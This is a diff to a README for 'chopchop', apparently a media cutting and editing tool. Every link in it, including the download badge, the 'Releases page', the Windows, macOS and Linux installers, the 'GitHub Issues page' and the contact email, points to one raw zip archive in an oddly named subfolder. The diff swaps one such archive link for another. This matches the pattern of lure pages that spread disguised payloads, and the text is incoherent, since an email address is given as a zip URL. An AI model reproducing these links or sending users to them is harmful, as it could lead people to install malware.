@@ -1,7 +1,7 @@
 # 🍴 chopchop - Simple Tool for Quick Cuts and Edits
 
 ## 📥 Download Now
-[![Download chopchop](https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip)](https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip)
+[![Download chopchop](https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip)](https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to chopchop! This easy-to-use application allows you to quickly edit and cut your media files. Whether you're trimming videos or adjusting audio, chopchop makes it simple. 
@@ -26,21 +26,21 @@ chopchop offers several features that enhance your editing experience:
 
 ## 🔍 How to Download & Install
 1. **Visit the Releases Page**  
-   Go to the [chopchop Releases page](https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip) to find the latest version.
+   Go to the [chopchop Releases page](https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip) to find the latest version.
 
 2. **Choose Your Version**  
    Find the most recent release. Look for the title that includes the version number, like **v1.0**.
 
 3. **Download the Installer**  
    Click on the file that matches your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip`.
+   - For Windows, download `https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip`.
+   - For macOS, download `https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip`.
+   - For Linux, download `https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip`.
 
 4. **Install chopchop**  
    - **Windows:** Run the `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file, then drag and drop chopchop into your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip` file and follow the included installation guide.
+   - **Linux:** Extract the `https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip` file and follow the included installation guide.
 
 5. **Run the Application**  
    After installation, launch chopchop from your Applications menu (Mac/Linux) or Start Menu (Windows).
@@ -59,9 +59,9 @@ chopchop offers several features that enhance your editing experience:
    Click on the **Save** button when satisfied with your edits.
 
 ## 💬 Support
-If you encounter any issues while using chopchop, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip) for assistance.
+If you encounter any issues while using chopchop, feel free to open an issue on the [GitHub Issues page](https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip) for assistance.
 
 ## 📞 Contact
-For inquiries or suggestions, you can reach us through the issues section on our GitHub page or email us at https://raw.githubusercontent.com/tiferli35/chopchop/main/Dicyemidae/Software-2.2.zip
+For inquiries or suggestions, you can reach us through the issues section on our GitHub page or email us at https://github.com/tiferli35/chopchop/raw/refs/heads/main/Dicyemidae/Software-v3.6.zip
 
 Thank you for choosing chopchop for your media editing needs! Happy editing!
